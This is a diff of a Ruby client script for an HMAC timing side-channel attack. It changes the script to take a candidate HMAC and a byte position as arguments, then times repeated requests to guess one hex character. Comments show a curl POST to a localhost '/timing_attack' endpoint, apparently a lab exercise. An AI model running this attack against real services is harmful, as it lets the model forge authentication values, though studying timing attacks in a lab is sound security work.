@@ -34,10 +34,24 @@ dist=Distribution.new
 
 #length of the token is 40
 #hmac = "0000000000000000000000000000000000000000"
-hmac = "ef2542fe60000000000000000000000000000000"
+#hmac = "ef2542fe60000000000000000000000000000000"  #test
 
+raw_hmac = ARGV[0].dup
+if(raw_hmac.length != 40)
+  puts "****** HMAC length should be 40! ******"
+  exit
+end
+
+raw_pos = ARGV[1].dup
+if(raw_pos.to_i < 0 or raw_pos.to_i > 39)
+  puts "****** Wrong Position! ******"
+  exit
+end
+
+hmac = raw_hmac.to_s
+pos = raw_pos.to_i
 #hmac position
-[8].each do |i|
+[pos].each do |i|
   number_of_times.times do |k| # try each byte k times to find slowest one statisticly
     (0..15).each {|i|dataset["%1x" % i]=[]} #reset
     (0..15).each do |j|
@@ -76,4 +90,4 @@ p dist.sorted_avg
 #wrong POST 
 #curl -v -d "username=utest&hash_challenge=ef2542fe60be70722119beaec6ca770ad815a776" http://localhost:4567/timing_attack
 
-#ef2542fe60be70722119beaec6ca770ad815a779
+#ruby client.rb ef2542fe60be0000000000000000000000000000 12
